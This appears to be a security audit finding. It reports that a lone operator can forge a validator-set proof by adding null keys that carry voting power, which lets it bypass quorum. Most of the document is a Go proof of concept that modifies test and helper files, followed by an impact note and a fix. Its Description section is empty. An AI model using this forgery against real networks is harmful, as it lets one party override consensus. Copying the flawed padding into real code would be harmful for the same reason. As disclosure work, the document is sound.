---
id: 25655
severity: "Medium"
---

# Malicious operator can alone, with any voting power smaller than quorum forge a proof

## Description



## Proof of Concept

Change `proof_test.go` to:

```go
func genValset(numValidators int, nonSigners []int) []ValidatorData {
	valset := make([]ValidatorData, numValidators)
	for i := 0; i < numValidators; i++ {
		pk := big.NewInt(int64(i + 1000000000000000000))
		valset[i].PrivateKey = pk
		valset[i].Key = getPubkeyG1(pk)
		valset[i].KeyG2 = getPubkeyG2(pk)
		valset[i].VotingPower = big.NewInt(1) // this has to be the real voting power of the rest of the set but it doesn't really matter for this poc as they won't sign. Only validator i == 0 is signing.
		valset[i].IsNonSigner = false
		if i != 0 {
			valset[i].IsNonSigner = true
		}
	}

	for _, nonSigner := range nonSigners {
		valset[nonSigner].IsNonSigner = true
	}

	return valset
}
```

Change `helpers.go` to the following. Note that n is 11 (set has length 10) to add the null key (0,0).

```go
func NormalizeValset(valset []ValidatorData) []ValidatorData {
	// Sort validators by key in ascending order
	sort.Slice(valset, func(i, j int) bool {
		// Compare keys (lower first)
		return valset[i].Key.X.Cmp(&valset[j].Key.X) < 0 || valset[i].Key.Y.Cmp(&valset[j].Key.Y) < 0
	})
	n := 11 //getOptimalN(len(valset))
	normalizedValset := make([]ValidatorData, n)
	for i := range n {
		if i < len(valset) {
			normalizedValset[i] = valset[i]
		} else {
			zeroPoint := new(bn254.G1Affine)
			zeroPoint.SetInfinity()
			zeroPointG2 := new(bn254.G2Affine)
			zeroPointG2.SetInfinity()
			normalizedValset[i] = ValidatorData{PrivateKey: big.NewInt(0), Key: *zeroPoint, KeyG2: *zeroPointG2, VotingPower: big.NewInt(30000000000000 * 10), IsNonSigner: false}
		}
	}
	return normalizedValset
}
```

In `proof.go` set `MaxValidators = []int{11}`. If the 3 verifiers 10, 100, 1000 were used this wouldn't be needed but the current commit defaults to 10 only and it's easier to allow 11 for this POC.

Go to `pkg/proof` and run `go test .`, it passes with 1 real voting power.

## Impact

Network is compromised and attacker can do whatever they want. Operator role is permissionless for some networks (depending on extensions) and even if it wasn't, they would still be able to completely bypass the quorum which is high severity.

## Recommendation

If the key is null, voting power must be null.
